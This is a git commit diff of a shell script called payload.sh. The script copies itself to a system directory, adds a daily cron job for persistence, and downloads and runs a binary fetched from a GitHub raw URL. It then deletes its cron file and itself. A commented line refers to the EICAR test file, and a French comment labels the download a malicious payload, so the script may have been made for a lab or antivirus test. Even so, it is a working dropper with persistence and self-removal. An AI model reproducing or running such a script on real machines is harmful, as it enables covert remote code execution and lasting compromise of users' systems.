47899189058e9ed66b50c91cb3de14eac8b9541c
b4ldrrr <artelia.yeve@gmail.com>
2024-06-25 15:57:02 +0200

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,17 +1,17 @@
 #!/bin/sh
 
 #Persistance
-cp ./payload.sh /usr/local/share/payload.sh
-crontab -l > mycron
-echo "0 0 * * * /usr/local/share/payload.sh" >> mycron
-crontab mycron
+cp ./payload.sh /usr/local/share/payload.sh;
+crontab -l > mycron;
+echo "0 0 * * * /usr/local/share/payload.sh" >> mycron;
+crontab mycron;
 
 #Test
-wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/php-fpm'; chmod 777 ./php-fpm; ./php-fpm
+wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; chmod 777 ./testmayoly; ./testmayoly;
 
 #Téléchargement charge malveillante
-#wget 'https://secure.eicar.org/eicar_com.zip'
+#wget 'https://secure.eicar.org/eicar_com.zip';
 
 #Nettoyage
-rm mycron
-rm ./payload.sh
+rm mycron;
+rm ./payload.sh;
